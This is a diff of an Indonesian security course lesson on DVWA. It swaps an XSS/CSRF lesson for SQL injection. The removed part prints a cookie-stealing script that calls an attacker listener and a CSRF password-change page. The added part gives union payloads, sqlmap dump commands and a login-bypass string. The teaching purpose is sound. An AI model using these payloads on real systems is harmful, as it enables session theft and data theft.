@@ -1,114 +1,132 @@
-# 🎭 Pertemuan 9: Web Application Security - XSS & CSRF
+# 💉 Pertemuan 9: Web Application Security - SQL Injection
 
 ## Daftar Isi
-1. [Apa itu Cross-Site Scripting (XSS)?](#1-apa-itu-cross-site-scripting-xss)
-2. [Jenis-Jenis XSS](#2-jenis-jenis-xss)
-3. [Hands-On: Stored XSS untuk Pencurian Cookie](#3-hands-on-stored-xss-untuk-pencurian-cookie)
-4. [Apa itu Cross-Site Request Forgery (CSRF)?](#4-apa-itu-cross-site-request-forgery-csrf)
-5. [Hands-On: CSRF Attack dengan Auto-Submit Form](#5-hands-on-csrf-attack-dengan-auto-submit-form)
-6. [Deteksi dan Pencegahan](#6-deteksi-dan-pencegahan)
-7. [Latihan Mandiri](#7-latihan-mandiri)
+1. [Pengantar SQL Injection](#1-pengantar-sql-injection)
+2. [Cara Kerja SQL Injection](#2-cara-kerja-sql-injection)
+3. [Jenis-Jenis SQL Injection](#3-jenis-jenis-sql-injection)
+4. [Hands-On: Setup Lab DVWA (Damn Vulnerable Web App)](#4-hands-on-setup-lab-dvwa-damn-vulnerable-web-app)
+5. [Hands-On: Manual Union-Based SQL Injection](#5-hands-on-manual-union-based-sql-injection)
+6. [Hands-On: Automated SQL Injection dengan sqlmap](#6-hands-on-automated-sql-injection-dengan-sqlmap)
+7. [Deteksi dan Pencegahan](#7-deteksi-dan-pencegahan)
+8. [Latihan Mandiri](#8-latihan-mandiri)
 
 ---
 
-## 1. Apa itu Cross-Site Scripting (XSS)?
+## 1. Pengantar SQL Injection
 
-**Cross-Site Scripting (XSS)** adalah jenis kerentanan di mana penyerang memasukkan script jahat (biasanya JavaScript) ke dalam halaman web yang dilihat oleh pengguna lain. Script ini dijalankan di browser korban dengan kredibilitas situs tersebut.
-
----
-
-## 2. Jenis-Jenis XSS
-
-1. **Stored XSS (Persisten)**: Script jahat tersimpan permanen di server (misal: di kolom komentar, profil user).
-2. **Reflected XSS (Non-Persisten)**: Script "dipantulkan" dari request HTTP (misal: via parameter pencarian di URL).
-3. **DOM-based XSS**: Kerentanan terjadi di client-side code (JavaScript) yang memproses input pengguna secara tidak aman tanpa melibatkan server.
+**SQL Injection (SQLi)** adalah kerentanan keamanan web yang memungkinkan penyerang untuk mengganggu query yang dibuat oleh aplikasi ke database. Penyerang biasanya dapat melihat data yang tidak seharusnya mereka akses, atau bahkan mengubah/menghapus data tersebut.
 
 ---
 
-## 3. Hands-On: Stored XSS untuk Pencurian Cookie
+## 2. Cara Kerja SQL Injection
 
-### 3.1 Setup Target
-1. Buka DVWA, login, set security ke **Low**.
-2. Pilih menu **XSS (Stored)**.
+SQLi terjadi ketika aplikasi mengambil input pengguna dan menggabungkannya langsung ke dalam query SQL tanpa sanitasi yang benar.
 
-### 3.2 Payload Dasar
-Masukkan script berikut di kolom komentar:
-```html
-<script>alert('Terinfeksi XSS!')</script>
+```sql
+-- Query Normal di Server
+"SELECT * FROM users WHERE id = " + userInput;
+
+-- Jika userInput = 1
+SELECT * FROM users WHERE id = 1;
+
+-- Jika userInput = 1 OR 1=1
+SELECT * FROM users WHERE id = 1 OR 1=1; -- Menampilkan SEMUA user!
 ```
 
-### 3.3 Pencurian Cookie
-Tujuannya adalah mengirim `document.cookie` milik korban ke server penyerang.
+---
 
-1. **Di Kali (Attacker)**: Jalankan listener sederhana.
+## 3. Jenis-Jenis SQL Injection
+
+1. **In-band SQLi (Classic)**: Penyerang menggunakan saluran komunikasi yang sama untuk melancarkan serangan dan mengambil hasil (misal: Union-based atau Error-based).
+2. **Inferential SQLi (Blind)**: Penyerang tidak bisa melihat data langsung, tapi bisa menyimpulkan data berdasarkan respon server (misal: Boolean-based atau Time-based).
+3. **Out-of-band SQLi**: Penyerang menggunakan saluran komunikasi berbeda (misal: DNS atau HTTP request dari database).
+
+---
+
+## 4. Hands-On: Setup Lab DVWA (Damn Vulnerable Web App)
+
+Kita menggunakan container `web-dvwa` yang sudah ada di `docker-compose.yml`.
+
+1. Pastikan container berjalan.
+2. Akses `http://localhost:8080` (tergantung port mapping Anda).
+3. Login dengan `admin` / `password`.
+4. Klik **DVWA Security** dan set level ke **Low**.
+5. Pilih menu **SQL Injection**.
+
+---
+
+## 5. Hands-On: Manual Union-Based SQL Injection
+
+### Langkah 1: Mencari Titik Kerentanan
+Masukkan `'` (petik tunggal) di kolom User ID. Jika muncul error SQL, berarti aplikasi rentan.
+
+### Langkah 2: Menentukan Jumlah Kolom
+Gunakan `ORDER BY`:
+```sql
+1' ORDER BY 1#  -- OK
+1' ORDER BY 2#  -- OK
+1' ORDER BY 3#  -- ERROR (Berarti ada 2 kolom)
+```
+
+### Langkah 3: Menampilkan Data via UNION
+Cari tahu kolom mana yang ditampilkan di layar:
+```sql
+1' UNION SELECT 1,2#
+```
+
+### Langkah 4: Mengambil Informasi Database
+```sql
+1' UNION SELECT database(), user()#
+```
+
+---
+
+## 6. Hands-On: Automated SQL Injection dengan sqlmap
+
+`sqlmap` adalah tool open-source yang mendeteksi dan mengeksploitasi celah SQLi secara otomatis.
+
+### 6.1 Scan Dasar
+Di container Kali:
 ```bash
-python3 -m http.server 8000
+# Ganti URL dan Cookie dengan yang ada di browser Anda
+sqlmap -u "http://172.20.0.10/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=..." --batch
 ```
 
-2. **Kirim Payload XSS**: Masukkan ini di DVWA:
-```html
-<script>document.location='http://172.20.0.5:8000/steal?cookie=' + document.cookie;</script>
+### 6.2 Mengambil Nama Database
+```bash
+sqlmap -u "http://..." --cookie="..." --dbs
 ```
 
-3. **Lihat Log**: Di terminal Kali, Anda akan melihat request masuk yang berisi session ID korban.
-
----
-
-## 4. Apa itu Cross-Site Request Forgery (CSRF)?
-
-**CSRF** adalah serangan yang memaksa pengguna yang sudah terautentikasi untuk melakukan tindakan yang tidak diinginkan pada aplikasi web tempat mereka saat ini masuk. CSRF menargetkan tindakan yang mengubah status, bukan pencurian data.
-
----
-
-## 5. Hands-On: CSRF Attack dengan Auto-Submit Form
-
-### 5.1 Skenario
-Kita akan memaksa admin mengubah password mereka tanpa mereka sadari.
-
-### 5.2 Analisis Request
-Di DVWA menu **CSRF**, perhatikan URL saat mengubah password:
-`http://localhost:8080/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change`
-
-### 5.3 Membuat Exploit Page
-Buat file HTML di mesin penyerang:
-
-```html
-<!-- csrf_attack.html -->
-<html>
-  <body onload="document.forms[0].submit()">
-    <h1>Selamat! Anda memenangkan Hadiah!</h1>
-    <form action="http://172.20.0.10/vulnerabilities/csrf/" method="GET">
-      <input type="hidden" name="password_new" value="rahasia123" />
-      <input type="hidden" name="password_conf" value="rahasia123" />
-      <input type="hidden" name="Change" value="Change" />
-    </form>
-  </body>
-</html>
+### 6.3 Dump Tabel Users
+```bash
+sqlmap -u "http://..." --cookie="..." -D dvwa -T users --dump
 ```
 
-### 5.4 Eksekusi
-Jika admin membuka link `csrf_attack.html` saat sedang login di DVWA, password mereka akan otomatis berubah menjadi `rahasia123`.
+---
+
+## 7. Deteksi dan Pencegahan
+
+### 7.1 Prepared Statements (Parameterized Queries)
+Ini adalah cara paling efektif. Data pengguna tidak lagi dianggap sebagai bagian dari perintah SQL.
+
+```php
+// Contoh PHP PDO - AMAN
+$stmt = $pdo->prepare('SELECT * FROM users WHERE email = :email');
+$stmt->execute(['email' => $email]);
+```
+
+### 7.2 Input Validation & Sanitization
+Hanya terima input yang sesuai format (misal: ID harus angka).
+
+### 7.3 Principle of Least Privilege
+Database user untuk aplikasi web sebaiknya tidak memiliki akses `root` atau `DROP TABLE`.
 
 ---
 
-## 6. Deteksi dan Pencegahan
+## 8. Latihan Mandiri
 
-### 6.1 Pencegahan XSS
-1. **Output Encoding**: Ubah karakter khusus (`<`, `>`, `&`) menjadi HTML entities (`&lt;`, `&gt;`).
-2. **Content Security Policy (CSP)**: Membatasi dari mana script boleh dimuat.
-3. **HttpOnly Cookie**: Mencegah JavaScript mengakses cookie.
+### Latihan 1: Blind SQL Injection
+Coba menu **SQL Injection (Blind)** di DVWA. Gunakan `sqlmap` dengan flag `--technique=B` untuk melihat bagaimana tool tersebut bekerja tanpa output data langsung.
 
-### 6.2 Pencegahan CSRF
-1. **Anti-CSRF Tokens**: Token unik dan acak yang harus disertakan dalam setiap request sensitif.
-2. **SameSite Cookie Attribute**: Membatasi pengiriman cookie pada cross-site requests.
-3. **Verifikasi Referer/Origin Header**: Memastikan request berasal dari domain yang sama.
-
----
-
-## 7. Latihan Mandiri
-
-### Latihan 1: Reflected XSS
-Coba menu **XSS (Reflected)**. Buatlah sebuah URL yang jika diklik orang lain akan memunculkan alert berisi nama mereka sendiri.
-
-### Latihan 2: CSP Bypass
-Baca artikel tentang bagaimana cara membypass Content Security Policy (CSP) yang lemah menggunakan teknik **JSONP callback**.
+### Latihan 2: Bypass Login
+Cari aplikasi web latihan lain dan coba bypass form login menggunakan `' OR '1'='1`.
